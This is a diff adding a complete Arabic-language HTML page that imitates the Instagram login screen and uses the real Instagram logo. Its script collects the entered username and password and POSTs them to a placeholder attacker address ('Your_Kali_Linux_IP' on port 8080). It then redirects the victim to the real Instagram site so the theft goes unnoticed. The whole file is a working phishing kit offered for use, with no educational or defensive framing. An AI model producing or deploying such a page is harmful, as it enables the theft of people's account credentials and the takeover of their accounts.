@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+ <html lang="ar">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل دخول Instagram</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #fff;
+            padding: 20px 30px;
+            border-radius: 5px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            width: 350px;
+            text-align: center;
+        }
+        img {
+            width: 200px;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0077b5;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2a99895421.png" alt="Instagram Logo" class="logo">
+        <form id="loginForm">
+            <input type="text" name="username" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
+            <input type="password" name="password" placeholder="كلمة المرور" required>
+            <button type="submit">تسجيل الدخول</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // منع الإرسال الافتراضي للنموذج
+
+            // الحصول على بيانات المستخدم
+            const formData = new FormData(event.target);
+            const username = formData.get('username');
+            const password = formData.get('password');
+
+            // إرسال البيانات إلى السيرفر باستخدام طلب POST
+            fetch('http://<Your_Kali_Linux_IP>:8080/login', { // استبدل <Your_Kali_Linux_IP> بعنوان IP الخاص بك
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
+            })
+            .then(() => {
+                // إعادة توجيه المستخدم إلى Instagram الحقيقي
+                window.location.href = "https://www.instagram.com";
+            })
+            .catch((error) => {
+                console.error('حدث خطأ:', error);
+                alert('حدث خطأ أثناء تسجيل الدخول.');
+            });
+        });
+    </script>
+</body>
+</html>
